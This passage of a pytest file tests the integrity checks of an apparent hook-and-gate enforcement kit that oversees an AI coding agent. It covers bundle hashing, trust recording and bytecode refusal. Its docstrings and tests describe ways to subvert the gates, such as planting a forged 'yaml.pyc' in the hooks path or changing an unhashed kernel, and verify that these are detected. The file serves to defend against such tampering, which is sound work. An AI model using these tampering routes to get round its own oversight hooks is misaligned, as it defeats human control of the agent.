    sys.path.insert(0, TEAM_KITS)
    from kernel import hashing
    spec = importlib.util.spec_from_file_location(
        "gpa_probe3", os.path.join(TEAM_KITS, "gen_provider_artifacts.py"))
    gpa = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gpa)
    # A subtree that does not exist yet, which is the only way to ask this question: any name the
    # repo already uses would be covered by the copy's list by accident.
    added = "policies"
    assert added not in hashing.BUNDLE_SUBTREES
    original = hashing.BUNDLE_SUBTREES
    hashing.BUNDLE_SUBTREES = original + (added,)
    try:
        claude = tmp_path / ".claude"
        for subtree in hashing.BUNDLE_SUBTREES:
            write(str(claude / subtree / "gate_a.py"), "OWNER = %r\n" % subtree)
        verifier = tmp_path / "verify.py"
        verifier.write_bytes(base64.b64decode(gpa.hook_bundle_verifier_b64()))

        def verify(against):
            return subprocess.run([sys.executable, "-B", str(verifier), str(claude), against],
                                  capture_output=True, text=True)

        agreed = verify(hashing.hook_bundle_hash(str(claude)))
        assert agreed.returncode == 0, (
            "the verifier does not measure %r, which the definition now names — its scope is "
            "written beside the definition instead of taken from it: %s"
            % (added, agreed.stdout + agreed.stderr))
        # ...and the agreement is not two blind spots cancelling out: changing ONLY the new subtree
        # must be a change the enforced measurement refuses.
        expected = hashing.hook_bundle_hash(str(claude))
        write(str(claude / added / "gate_a.py"), "OWNER = 'rewritten'\n")
        assert verify(expected).returncode == 2
    finally:
        hashing.BUNDLE_SUBTREES = original


# -- is the thing that is HASHED the thing that RUNS? --------------------------


def _restamped_staging(tmp_path):
    """A private copy of `team-kits/`, re-stamped so every VERSION matches its own contents.

    The recorder's first check is that the kit still hashes to its own VERSION, so running it
    against the REAL `team-kits/` makes every test that needs an installed bundle fail whenever
    someone has not yet run `bump_kit_version.py` — an off-topic red that hides whatever the test
    was about, and hid it for a dozen tests at a time. A copy that stamps itself asks only the
    question these tests ask; `_scaffolded_bundle` goes through here for the same reason.

    ONE COPY PER tmp_path, REUSED. A test that installs into two repositories wants the same
    staging both times, and re-copying would either raise or silently discard a staging the test
    had just modified on purpose. Under its OWN directory name, because a test may need a second,
    deliberately UNSTAMPED staging beside this one — `test_trust_cannot_be_reset_by_re_running_the_
    recorder` builds exactly that to prove an unstamped mirror is refused, and sharing the name
    would have handed it the stamped copy instead.
    """
    staging = pathlib.Path(str(tmp_path)) / "restamped-kits"
    if staging.is_dir():
        return staging
    _copy_kit_tree(TEAM_KITS, staging)
    _restamp(staging)
    return staging


def _copy_kit_tree(source, target):
    """Copy a kit source tree the way an installer does: everything except the tool leftovers.

    THE RULE COMES FROM `kernel.hashing`, WHERE THERE IS EXACTLY ONE OF IT. `transient_ignore_globs`
    exists for precisely this shape of copy — `copytree` asks per directory ENTRY rather than per
    relative path — and the helpers here had written another copy of the idea by hand, already
    incomplete against the definition it was copying (`.mypy_cache` and `*.pyo` were missing).

    What that costs is not hypothetical, and it is worth stating exactly rather than dramatically. A
    leftover the copy keeps is installed by `_install_from` into `.claude/kernel`, and there it is a
    STRANGER by construction: `_shipped_files` drops it from what the kit ships while `_bundle_files`
    finds it anyway. What the recorder then does depends on the leftover — `foreign_importables`
    refuses only what would load, so a `.mypy_cache/` holding a `.py` is rc 1 while `.mypy_cache/`
    holding its usual JSON, or a `planted.pyo`, is a warning line and rc 0 with the file inside the
    recorded hash. Either way these tests would be measuring an installation nobody meant to build,
    out of a source tree that this checkout happens not to contain today.
    """
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import transient_ignore_globs
    shutil.copytree(str(source), str(target), dirs_exist_ok=True,
                    ignore=shutil.ignore_patterns(*transient_ignore_globs()))


def test_the_staging_these_tests_install_from_carries_no_tool_leftover(tmp_path):
    """The copy that stands in for an installer has to drop what an installer drops.

    Derived from the definition rather than from the four globs that used to be written here: one
    leftover per member of `TRANSIENT_DIRS` (at the root AND nested, since a cache directory is
    found at any depth) and one per `BYTECODE_SUFFIXES`, then `is_transient` is asked what arrived.
    A hand-written glob list that misses a member of either set is red, which the one it replaced
    would have been."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import BYTECODE_SUFFIXES, TRANSIENT_DIRS, is_transient
    source = tmp_path / "source"
    write(str(source / "kept.py"), "x = 1\n")
    for name in sorted(TRANSIENT_DIRS):
        write(str(source / name / "leftover"), "x\n")
        write(str(source / "nested" / name / "deep" / "leftover"), "x\n")
    for suffix in BYTECODE_SUFFIXES:
        write(str(source / ("planted" + suffix)), "x\n")
    target = tmp_path / "copy"
    _copy_kit_tree(source, target)
    arrived = sorted(
        os.path.relpath(os.path.join(current, name), str(target)).replace(os.sep, "/")
        for current, _dirs, files in os.walk(str(target)) for name in files)
    assert [name for name in arrived if is_transient(name)] == [], (
        "the staging copy carried tool leftovers: %s" % arrived)
    assert arrived == ["kept.py"], arrived


def _restamp(staging):
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import kit_hash
    for kit in KITS:
        (staging / kit / "VERSION").write_text(
            "version: 9999.01.01-1\ncontent: %s\n" % kit_hash(str(staging / kit)),
            encoding="utf-8")


def _install_from(staging, repo, kit="dev-team"):
    """Install a kit's enforcement bundle out of `staging` and run THAT staging's recorder."""
    hooks = repo / ".claude" / "hooks"
    os.makedirs(str(hooks), exist_ok=True)
    for entry in sorted(os.listdir(str(staging / kit / "hooks"))):
        source = staging / kit / "hooks" / entry
        if source.is_file():
            shutil.copyfile(str(source), str(hooks / entry))
    _copy_kit_tree(staging / "kernel", repo / ".claude" / "kernel")
    write(str(repo / ".claude" / "settings.json"), "{}")
    return _record_trust(staging, repo, kit)


def _record_trust(staging, repo, kit="dev-team"):
    return subprocess.run(
        [sys.executable, str(staging / "write_kit_state.py"), "--repo", str(repo), "--kit", kit],
        capture_output=True, text=True)


def test_the_kit_stamp_covers_the_kernel_every_kit_installs(tmp_path):
    """A kernel-only change must invalidate every kit's stamp, and it did not.

    `KIT_SHARED_FILES` named nine files at the team-kits root; the scaffold also installs the whole
    `kernel/` tree as `.claude/kernel`, and that subtree was in no kit's hash — including
    `hashing.py`, which DEFINES the hash. Two consequences, and the second is the one that bites
    daily:

    (a) editing the kernel in a staging needed no re-stamp, so `write_kit_state.py` — whose job is
        to refuse a source that no longer hashes to its own VERSION — recorded trust for it.
    (b) a kernel-only release bumped no kit VERSION, so `session_status` announced no update and A
        SECURITY FIX TO THE ENFORCEMENT KERNEL never reached an installed project unless some
        unrelated kit file happened to change with it.

    Both are asserted here against a re-stamped copy, so the claim is "this stamp covers that
    tree", not "somebody ran the bumper".
    """
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import kit_hash, recorded_kit_hash
    staging = _restamped_staging(tmp_path)
    for kit in KITS:
        assert kit_hash(str(staging / kit)) == recorded_kit_hash(str(staging / kit)), kit

    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0

    write(str(staging / "kernel" / "report.py"), "def validate_state(*a):\n    return []\n")
    # (b) — every kit is now unstamped, so the next release bumps every kit's VERSION and every
    # installed project is told an update exists.
    stale = [kit for kit in KITS
             if kit_hash(str(staging / kit)) != recorded_kit_hash(str(staging / kit))]
    assert sorted(stale) == sorted(KITS), (
        "a kernel-only change left these kits' stamps valid: %s"
        % sorted(set(KITS) - set(stale)))
    # (a) — and the recorder refuses to bless an installation from that staging
    refused = _install_from(staging, tmp_path / "repo2")
    assert refused.returncode == 1, refused.stdout + refused.stderr
    assert "VERSION" in refused.stderr, refused.stderr


def test_bytecode_planted_in_the_bundle_is_hashed_and_named(tmp_path):
    """`.claude/hooks` is `sys.path[0]` of every gate process, so a bare `yaml.pyc` there is an
    importable SOURCELESS MODULE that owns the YAML parser of every gate — and a forged
    `__pycache__/state.cpython-313.pyc` replaces the executed code of a module whose source IS
    hashed. Both were invisible: excluded from the bundle hash and from the stranger scan, so the
    file could be written with no recorder run, no stamp, no change in `python scripts/harness.py doctor`.

    The exclusion's stated reason was true (running the hooks used to create `__pycache__` there),
    but the answer to that was to stop writing bytecode into the bundle, not to take the execution
    paths out of the measurement."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash, strangers_in_the_bundle
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    claude = str(repo / ".claude")
    before = hook_bundle_hash(claude)

    for planted in (os.path.join(claude, "hooks", "yaml.pyc"),
                    os.path.join(claude, "kernel", "__pycache__", "state.cpython-313.pyc")):
        os.makedirs(os.path.dirname(planted), exist_ok=True)
        with open(planted, "wb") as handle:
            handle.write(b"\x00\x0f\x0d\x0a" + b"forged bytecode")
        assert hook_bundle_hash(claude) != before, "%s is outside the bundle hash" % planted
        named = strangers_in_the_bundle(claude, str(staging / "dev-team" / "hooks"),
                                        str(staging / "kernel"))
        assert any(os.path.basename(planted) in name for name in named), (planted, named)
        os.remove(planted)

    # ...and the two consumers agree, in the order a project meets them. A session that starts
    # after the file appeared withdraws trust — the whole point of hashing it.
    assert _run_trust_hook(repo).returncode == 0
    assert _kit_state(repo)["state"] == "active"
    write(os.path.join(claude, "hooks", "yaml.pyc"), "not really bytecode\n")
    proc = _run_trust_hook(repo)
    assert proc.returncode == 0, proc.stderr
    assert _kit_state(repo)["state"] == "hooks_trust_required"
    # ...and the recorder REFUSES instead of quietly hashing around it: a bare `.pyc` in
    # `sys.path[0]` is a sourceless module, which is the importable half of the stranger rule
    # (`test_a_stranger_that_would_import_is_refused`). What this line adds to that one is the
    # order a project meets the two answers in — the hash withdrew trust first, and the recorder
    # will not hand it back.
    recorded = _record_trust(staging, repo)
    assert recorded.returncode == 1, recorded.stdout + recorded.stderr
    assert "hooks/yaml.pyc" in recorded.stderr.replace("\\", "/"), recorded.stderr


def test_bytecode_left_in_a_staging_is_not_demanded_of_the_installation(tmp_path):
    """The other side of the same definition, and the reason it is two enumerations rather than
    one rule. What is MEASURED is everything installed; what is SHIPPED is what the scaffold
    copies, and it prunes bytecode. A staging that has accumulated a `.pyc` — someone ran python
    in it — therefore describes an installation without one, and the recorder must not read that
    difference as "these installed files are not the kit's" and refuse a clean install."""
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo).returncode == 0
    write(str(staging / "dev-team" / "hooks" / "yaml.pyc"), "someone imported something\n")
    write(str(staging / "kernel" / "__pycache__" / "state.cpython-313.pyc"), "likewise\n")
    again = _record_trust(staging, repo)
    assert again.returncode == 0, again.stdout + again.stderr
    assert "not the 'dev-team' kit's" not in again.stderr, again.stderr


def _bundle_bytecode(claude_dir):
    """Every bytecode artifact under the installed enforcement subtrees, as posix paths."""
    found = []
    for subtree in ("hooks", "kernel"):
        for current, _dirs, files in os.walk(os.path.join(claude_dir, subtree)):
            for name in files:
                if name.endswith((".pyc", ".pyo")):
                    found.append(os.path.relpath(os.path.join(current, name),
                                                 claude_dir).replace(os.sep, "/"))
    return sorted(found)


def _hooks_started_by_their_own_registration(kit):
    """Bundle scripts an interpreter is pointed AT, as opposed to ones `_gate.py` launches.

    THE DISTINCTION IS WHOSE REFUSAL APPLIES. `_gate.py` sets `sys.dont_write_bytecode` before it
    imports anything, so every gate it launches inherits the refusal however the launcher itself was
    started. A hook that is its own command inherits nothing: the `-B` in the registration is the
    only thing standing between it and a `__pycache__` inside the hashed bundle, and `-B` is
    precisely what a hand-started run does not have.

    Derived rather than listed: every registration surface (`_all_registrations`) read with the
    KERNEL's own definition of what a command runs (`_invoked_scripts`), whose first entry is the
    script the interpreter is handed. A hook that gains a direct registration is covered the day it
    does."""
    from kernel.report import _invoked_scripts
    started = set()
    for _source, _event, _matcher, command in _all_registrations(kit):
        names = _invoked_scripts(command)
        if names and names[0] != GATE_LAUNCHER:
            started.add(names[0])
    return started


@pytest.mark.parametrize("kit", KITS)
def test_running_the_enforcement_layer_writes_no_bytecode_into_it(tmp_path, kit):
    """The precondition for hashing bytecode at all: a bundle that changes by being RUN cannot be
    trusted against, which is precisely why `.pyc` used to be excluded from the measurement.

    THE SUBJECT IS EVERY ENTRY POINT, not the launcher plus one hook. `_gate.py` covers what it
    launches, and its own comment says why the flag is there at all — a gate is also started by
    hand, by the suite or by a person diagnosing one. The hooks a kit registers as commands of their
    OWN are started the same way and inherit nothing from the launcher, so before
    2026-07-27 a hand-started `session_status.py` left `_compat.pyc` and `_root.pyc` in the hashed
    bundle and the next SessionStart reported `hooks_trust_required` — a diagnosis that destroys
    what it diagnoses, which is the same defect this file's CLI half was fixed for.

    THE CHILD ENVIRONMENT IS CLEANED FIRST: `conftest` sets `PYTHONPYCACHEPREFIX` for the whole
    suite, which would redirect the bytecode out of the bundle all by itself and make this pass over
    a kit that does nothing. The per-hook CONTROL is the other half of that, and it is the mutation
    rather than a stand-in for it: the same file with its `sys.dont_write_bytecode` line deleted,
    started identically, has to cache. So each assertion above is the hook's doing and not the
    runner's, and no hook can pass by exiting before it imports anything."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import prune_transient
    staging = _restamped_staging(tmp_path)
    repo = tmp_path / "repo"
    assert _install_from(staging, repo, kit).returncode == 0
    claude = str(repo / ".claude")
    hooks = os.path.join(claude, "hooks")
    env = dict(os.environ)
    env.pop("PYTHONPYCACHEPREFIX", None)
    env.pop("PYTHONDONTWRITEBYTECODE", None)
    payload = json.dumps({"cwd": str(repo), "tool_name": "Agent", "tool_input": {}})

    def started(script):
        return subprocess.run([sys.executable, script], input=payload, capture_output=True,
                              text=True, cwd=str(repo), env=env)

    # the launcher, WITHOUT -B on the command line: its own `sys.dont_write_bytecode` has to hold
    launched = subprocess.run(
        [sys.executable, os.path.join(hooks, "_gate.py"), "gate_dispatch.py"],
        input=payload, capture_output=True, text=True, cwd=str(repo), env=env)
    assert launched.returncode in (0, 2), launched.stdout + launched.stderr
    assert _bundle_bytecode(claude) == [], "the launcher changed the bundle by being run"

    directly = sorted(_hooks_started_by_their_own_registration(kit))
    assert directly, "no directly registered hook found — the derivation no longer sees the kit"
    for name in directly:
        script = os.path.join(hooks, name)
        assert os.path.isfile(script), "%s registers %s, which it does not ship" % (kit, name)
        run = started(script)
        assert "Traceback" not in run.stderr, run.stderr
        assert _bundle_bytecode(claude) == [], (
            "%s changed the hashed bundle by being run: %s" % (name, _bundle_bytecode(claude)))

        # the control: this hook, minus the one line that makes the assertion above true
        with open(script, encoding="utf-8") as handle:
            source = handle.read()
        refusal = "sys.dont_write_bytecode = True\n"
        assert refusal in source, "%s states no refusal, so the control below tests nothing" % name
        control_path = os.path.join(hooks, "_control_" + name)
        write(control_path, source.replace(refusal, "", 1))
        control = started(control_path)
        assert "Traceback" not in control.stderr, control.stderr
        assert _bundle_bytecode(claude) != [], (
            "%s cached nothing even with its refusal removed, so it never got as far as importing "
            "the bundle and the assertion above proves nothing about it" % name)
        os.remove(control_path)
        prune_transient(hooks, os.path.join(claude, "kernel"))


def _env_disables_bytecode(value):
    """The INTERPRETER's reading of `PYTHONDONTWRITEBYTECODE`, which is not "the name occurs".

    CPython ignores the variable when it is unset or empty and when its value parses as the integer
    0; anything else — text, a negative number — counts as 1 (`config_read_env_vars` via
    `_Py_get_env_flag`). Measured 2026-07-27: `PYTHONDONTWRITEBYTECODE=0 python x.py` writes
    `__pycache__` next to the import, so a check that only looked for the NAME would have called
    that command incapable of caching.
    """
    if not value:
        return False
    try:
        return int(value) != 0
    except ValueError:
        return True


def _bytecode_is_disabled(command):
    """Can the process this command starts write bytecode? None when it starts no interpreter.

    Reads the INVOCATION rather than the string: the interpreter word, then the option cluster up
    to the first token that is not an option. `-B` may travel inside a cluster (`-BE`), and an
    exported `PYTHONDONTWRITEBYTECODE` answers the same question — what has to be true is the
    property, not one spelling of it. The environment prefix is read with the interpreter's own
    rule (`_env_disables_bytecode`), in both shells' spellings of an assignment: POSIX
    `NAME=value cmd` and PowerShell `$env:NAME='value';`.
    """
    tokens = command.split()
    for index, token in enumerate(tokens):
        # backticks too: the same invocation appears inside prose and inside remedy strings, where
        # it is quoted as `python -B -m kernel.cli …`, and a checker that only understood the
        # settings.json spelling would silently answer None ("no interpreter here") to all of them
        base = os.path.basename(token.strip("\"'`").replace("\\", "/")).lower()
        if not re.fullmatch(r"(?:python[0-9.]*|py|pypy[0-9.]*)(?:\.exe)?", base):
            continue
        assigned = re.search(r"PYTHONDONTWRITEBYTECODE\s*=\s*[\"']?([^\s\"';]*)",
                             " ".join(tokens[:index]))
        if assigned and _env_disables_bytecode(assigned.group(1)):
            return True
        for option in tokens[index + 1:]:
            if not option.startswith("-"):
                return False
            if "B" in option[1:].split("=")[0]:
                return True
        return False
    return None


def test_the_bytecode_rule_reads_the_value_and_not_the_name():
    """The control on the checker every rule below is measured with.

    `PYTHONDONTWRITEBYTECODE=0` is the shape that matters: the variable is present, and the
    interpreter still caches (measured — see `_env_disables_bytecode`). A checker that answered
    "disabled" to it would wave through exactly the registration it exists to catch, and every
    green assertion in this section would mean nothing.
    """
    assert _bytecode_is_disabled("python -B .claude/hooks/x.py") is True
    assert _bytecode_is_disabled("python -BE .claude/hooks/x.py") is True
    assert _bytecode_is_disabled("PYTHONDONTWRITEBYTECODE=1 python .claude/hooks/x.py") is True
    assert _bytecode_is_disabled("$env:PYTHONDONTWRITEBYTECODE='1'; python .claude/hooks/x.py") \
        is True
    assert _bytecode_is_disabled("python .claude/hooks/x.py") is False
    assert _bytecode_is_disabled("PYTHONDONTWRITEBYTECODE=0 python .claude/hooks/x.py") is False
    assert _bytecode_is_disabled("PYTHONDONTWRITEBYTECODE= python .claude/hooks/x.py") is False
    assert _bytecode_is_disabled("node index.js") is None


@pytest.mark.parametrize("kit", KITS)
def test_no_registered_hook_may_write_bytecode(kit):
    """The rule, over the surface that decides it. Every registration starts a Python process whose
    `sys.path[0]` is the hashed bundle, so every one of them must be unable to cache anything into
    it — otherwise the bundle hash reports `hooks_trust_required` for no reason but a session
    having happened.

    Both registration surfaces (see `_all_registrations`): the agents' own frontmatter carries
    blocking hooks too, and a rule enforced over settings.json alone would leave thirty commands
    out."""
    for source, event, _matcher, command in _all_registrations(kit):
        if not re.search(r"\.claude/hooks/[A-Za-z0-9_]+\.py", command.replace("\\", "/")):
            continue
        assert _bytecode_is_disabled(command) is True, (
            "%s/%s (%s) may write bytecode into the hashed bundle: %s"
            % (kit, source, event, command))


def _options_handed_to(command, interpreter, payload):
    """The interpreter options in the invocation that runs `payload` — everything between the two.

    Located from the PAYLOAD backwards, because the two processes in a Codex hook command are told
    apart by what they are asked to run and by nothing else. The last occurrence of the payload is
    the operative one: both commands mention the hook script earlier, in the root walk that looks
    for it.
    """
    prefix = command[:command.rindex(payload)]
    return prefix[prefix.rindex(interpreter) + len(interpreter):]


def test_the_generated_codex_commands_also_refuse_to_cache(tmp_path):
    """Codex commands are REBUILT from the script path, so the `-B` in settings.json does not
    travel — it has to be stated again in the generator. Two interpreter invocations per hook, and
    the verifier's is the one that must not be forgotten: it runs FIRST on every tool call, so a
    `.pyc` written by it would change the bundle between one verification and the next.

    PER INVOCATION, not per command. Counting the flags said `2` to a command with two `-B` on the
    verifier and none on the hook — the same number, and a bundle that changes under its own
    gate."""
    gpa = load_kit_module("gpa_bytecode", os.path.join(TEAM_KITS, "gen_provider_artifacts.py"))
    posix, windows = gpa.codex_hook_commands(
        'python -B "${CLAUDE_PROJECT_DIR}/.claude/hooks/_gate.py" gate_dispatch.py',
        bundle_hash="deadbeef")
    for command, interpreter, verifier, hook in (
            (posix, '"$py"', "import base64", ".claude/hooks/_gate.py"),
            (windows, "$py.Source", "(Join-Path $root '.claude')", ".claude/hooks/_gate.py")):
        for role, payload in (("verifier", verifier), ("hook", hook)):
            options = _options_handed_to(command, interpreter, payload)
            assert re.search(r"(?<![\w-])-[A-Za-z]*B", options), (
                "the %s invocation may cache into the bundle it is verifying: %r" % (role, options))


def _bundle_module_names():
    """Every top-level module name an installed bundle would answer an `import` with.

    Derived from what the kits ship, not listed: the hook basenames (`.claude/hooks` is
    `sys.path[0]` for anything that adds it) plus the kernel package.
    """
    names = {"kernel"}
    for kit in KITS:
        for entry in os.listdir(os.path.join(TEAM_KITS, kit, "hooks")):
            if entry.endswith(".py"):
                names.add(entry[:-3])
    return names


def _kit_tree_module_names():
    """Every top-level module name `team-kits/` itself would answer an `import` with.

    The same derivation one layer out: whatever a `sys.path` entry pointing at that directory
    exposes — the packages and the scripts sitting at its root. Read off the tree, so a new root
    module is covered on the day it lands.
    """
    names = set()
    for entry in sorted(os.listdir(TEAM_KITS)):
        if entry.endswith(".py"):
            names.add(entry[:-3])
        elif os.path.isfile(os.path.join(TEAM_KITS, entry, "__init__.py")):
            names.add(entry)
    return names


def _toplevel_imports(tree):
    """The top-level module names an already-parsed module imports, absolute imports only.

    A relative import cannot reach a `sys.path` entry, so it cannot be the thing that drags a
    foreign tree into the process.
    """
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
            imported.add(node.module.split(".")[0])
    return imported


def _disables_bytecode_itself(tree):
    """Does this already-parsed module assign `sys.dont_write_bytecode = True` at module scope?"""
    return any(
        isinstance(node, ast.Assign)
        and any(isinstance(target, ast.Attribute) and target.attr == "dont_write_bytecode"
                for target in node.targets)
        and isinstance(node.value, ast.Constant) and node.value.value is True
        for node in tree.body)


def test_a_shipped_script_that_imports_the_bundle_disables_bytecode_itself():
    """Whoever imports the enforcement bundle from OUTSIDE it must refuse to cache it.

    The bundle's own files are covered by how they are started, and that is three claims rather
    than the two it used to be: the kits register every hook as `python -B`, `_gate.py` sets the
    flag for anything it launches, and the CLI is documented and remedied as `python -B -m
    kernel.cli` (`test_every_written_down_kernel_cli_invocation_refuses_to_cache`). The third was
    missing, which made this sentence false for `kernel/cli.py` — the one bundle file a person is
    told to run by hand. Nothing constrains how a
    project's `scripts/*.py` is started — a person runs the dashboard generator, CI runs
    `kit_checks` — and those DO import `_kernel` out of `.claude/hooks`, which drops
    `__pycache__` into the two directories `hook_bundle_hash` measures. The symptom is not
    subtle and would be blamed on anything but its cause: `hooks_trust_required` at the next
    session because somebody generated a dashboard.

    The subject is derived twice (`_bundle_module_names`, and the imports parsed out of each file)
    so that a new script or a renamed hook is covered on the day it ships."""
    bundle = _bundle_module_names()
    candidates = sorted(globmodule.glob(os.path.join(TEAM_KITS, "*.py")) + globmodule.glob(
        os.path.join(TEAM_KITS, "*", "templates", "repo", "scripts", "*.py")))
    assert candidates, "no shipped scripts found — the glob no longer matches the tree"
    checked = []
    for path in candidates:
        with open(path, encoding="utf-8") as handle:
            tree = ast.parse(handle.read(), path)
        imported = _toplevel_imports(tree)
        if not imported & bundle:
            continue
        checked.append(os.path.relpath(path, TEAM_KITS).replace(os.sep, "/"))
        assert _disables_bytecode_itself(tree), (
            "%s imports the enforcement bundle (%s) without disabling bytecode writing, so running "
            "it caches .pyc into the hashed bundle" % (checked[-1], sorted(imported & bundle)))
    assert len(checked) >= 3, "the import detection found almost nothing: %s" % checked


def _imports_out_of_the_kit_tree(tree):
    """Does this module import something only `team-kits/` provides?

    THE PROPERTY IS THE IMPORT, NOT THE `sys.path` LINE, and the first version got that wrong in a
    way its own repo demonstrated. It looked for a `sys.path.insert(...)` whose CALL ARGUMENTS
    literally contained the string `"team-kits"` — so the ordinary spelling, a module-level
    `TEAM_KITS = os.path.join(ROOT, "team-kits")` followed by `sys.path.insert(0, TEAM_KITS)`, was
    invisible. Measured: a tool written that way cached `team-kits/kernel/__pycache__` while the
    test stayed green, which is the promise "a new tool is covered on the day it imports the tree"
    failing on the likeliest case.

    Asked the same way as for the shipped scripts (`_toplevel_imports` against
    `_kit_tree_module_names`): a name that only that directory answers means the tree ends up on
    `sys.path` somehow, and HOW is not this check's business.
    """
    return bool(_toplevel_imports(tree) & _kit_tree_module_names())


def test_a_repo_tool_that_imports_the_kit_tree_leaves_no_bytecode_in_it(tmp_path):
    """The same rule one layer out, over the tools the REPO runs rather than the ones it ships.

    `team-kits/` is the source side of the two claims the bundle hash rests on: the installer
    stages it, the scaffold copies `team-kits/kernel` into `.claude/kernel`, and `kit_hash` may
    leave bytecode out of what a kit contains only because a kit ships none. A tool that imports
    the kernel to compute that very hash and leaves a `hashing.cpython-*.pyc` behind is the one
    thing that would make the exclusion untrue at its source — measured before the fix: a bare
    `python tools/bump_kit_version.py` left `team-kits/kernel/__pycache__` on disk.

    THE SUBJECT IS DERIVED, and both halves of the derivation matter. `_imports_out_of_the_kit_tree`
    picks the tools that reach into the tree at all; the suite is then excluded by pytest's own
    rule for what it collects (`conftest.py`, `test_*.py`), because the suite is shielded
    differently — `conftest.PYCACHE_DIR` redirects its cache — and `test_hooks.py`'s
    `test_the_suite_leaves_no_bytecode_in_the_kit_tree` is the assertion for that half. A new tool
    is covered on the day it imports the tree.

    RUN, NOT READ: the two tools state the property in different ways — `bump_kit_version.py`
    with `sys.dont_write_bytecode`, `validate.py` with that plus an in-memory `compile()` — so
    what has to hold is the outcome, not a spelling. Against a COPY, since the stamper writes
    VERSION files. The control at the end is what keeps the assertion from being vacuous: the same
    environment DOES cache the same import when nobody refuses it.
    """
    tools = sorted(path for path in globmodule.glob(os.path.join(ROOT, "tools", "*.py"))
                   if not os.path.basename(path).startswith("test_")
                   and os.path.basename(path) != "conftest.py")
    assert tools, "no repo-side tools found — the glob no longer matches the tree"
    subjects = []
    for path in tools:
        with open(path, encoding="utf-8") as handle:
            if _imports_out_of_the_kit_tree(ast.parse(handle.read(), path)):
                subjects.append(os.path.basename(path))
    assert len(subjects) >= 2, "the import detection found almost nothing: %s" % subjects

    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import transient_ignore_globs
    ignore = shutil.ignore_patterns(*transient_ignore_globs())
    copy = tmp_path / "repo"
    shutil.copytree(TEAM_KITS, str(copy / "team-kits"), ignore=ignore)
    shutil.copytree(os.path.join(ROOT, "tools"), str(copy / "tools"), ignore=ignore)
    env = dict(os.environ)
    env.pop("PYTHONPYCACHEPREFIX", None)
    env.pop("PYTHONDONTWRITEBYTECODE", None)

    def caches():
        return sorted(
            os.path.relpath(os.path.join(current, name), str(copy)).replace(os.sep, "/")
            for current, dirs, _files in os.walk(str(copy / "team-kits"))
            for name in dirs if name == "__pycache__")

    for name in subjects:
        proc = subprocess.run([sys.executable, str(copy / "tools" / name)],
                              capture_output=True, text=True, env=env, cwd=str(copy))
        # A tool that died on its way IN would leave the tree clean for the wrong reason, so
        # what has to hold is that the run got PAST its module-level imports -- and what says
        # so is the absence of a traceback. A tool that refuses the arguments this call does
        # not give it prints argparse's usage and exits 2, and by then every import has run;
        # `tools/migrate_holes.py` is the first such tool in the tree and demanding rc 0 of it
        # would mean an argument table here that grows with every new tool. Both directions of
        # this reading are measured in
        # `tools/test_hooks_v2.py::test_the_bytecode_check_still_notices_a_tool_that_dies_on_import`.
        assert "Traceback (most recent call last)" not in proc.stderr, (
            "%s died on its way in: %s%s" % (name, proc.stdout, proc.stderr))
        assert caches() == [], "%s cached bytecode into the kit tree: %s" % (name, caches())

    # THE CONTROL IS A TOOL WRITTEN THE ORDINARY WAY, and it carries the second claim as well as the
    # first. As a control it shows the same environment DOES cache the same import when nobody
    # refuses it, so the green assertions above are the tools' doing. As a check on the DETECTOR it
    # is the spelling the previous version could not see — a module-level `TEAM_KITS` constant fed
    # to `sys.path.insert`, which is how this repo's own tools are written — and while that was
    # missed, a tool of exactly this shape cached into the kit tree with the test green.
    decoy = copy / "tools" / "newtool.py"
    write(str(decoy),
          "import os, sys\n"
          "TEAM_KITS = os.path.join(\n"
          "    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'team-kits')\n"
          "sys.path.insert(0, TEAM_KITS)\n"
          "import kernel.hashing  # noqa: F401\n")
    with open(str(decoy), encoding="utf-8") as handle:
        assert _imports_out_of_the_kit_tree(ast.parse(handle.read(), str(decoy))), (
            "a tool that imports the kit tree the ordinary way is invisible to the detection "
            "above, so 'a new tool is covered on the day it imports the tree' is not true")
    control = subprocess.run([sys.executable, str(decoy)],
                             capture_output=True, text=True, env=env, cwd=str(copy))
    assert control.returncode == 0, control.stderr
    assert caches() != [], (
        "the control cached nothing either, so the assertions above prove nothing about the tools")


def test_the_bytecode_check_still_notices_a_tool_that_dies_on_import(tmp_path):
    """The reading the check above rests on, in both directions.

    It stopped demanding rc 0 of the tools it runs, because `tools/migrate_holes.py` refuses a call
    that names no `--root` and every module-level import has already run by then. What it demands
    instead is that no traceback reached stderr, and that is only worth anything if the two cases
    really look different. So: a tool that dies on its way IN prints one, a tool that refuses its
    ARGUMENTS does not.

    Written as two throwaway tools rather than against the shipped ones, because what is measured
    is the property of the two failure modes and not today's tool list.
    """
    tools = tmp_path / "tools"
    tools.mkdir()
    dies = tools / "dies_on_import.py"
    write(str(dies), "import a_module_no_interpreter_has  # noqa: F401\n")
    refuses = tools / "refuses_its_arguments.py"
    write(str(refuses),
          "import argparse\n"
          "parser = argparse.ArgumentParser()\n"
          "parser.add_argument('--root', required=True)\n"
          "parser.parse_args()\n")

    env = dict(os.environ)
    env.pop("PYTHONPYCACHEPREFIX", None)
    env.pop("PYTHONDONTWRITEBYTECODE", None)

    def run(path):
        return subprocess.run([sys.executable, str(path)], capture_output=True, text=True,
                              env=env, cwd=str(tmp_path))

    died = run(dies)
    assert died.returncode != 0, died.stdout + died.stderr
    assert "Traceback (most recent call last)" in died.stderr, (
        "a tool that dies on its way in leaves no traceback, so the check above cannot see it: %s"
        % died.stderr)

    refused = run(refuses)
    assert refused.returncode == 2, refused.stdout + refused.stderr
    assert "Traceback (most recent call last)" not in refused.stderr, (
        "a tool that only refuses its arguments prints a traceback, so the check above would read "
        "it as one that never got past its imports: %s" % refused.stderr)
    assert "usage:" in refused.stderr, refused.stderr


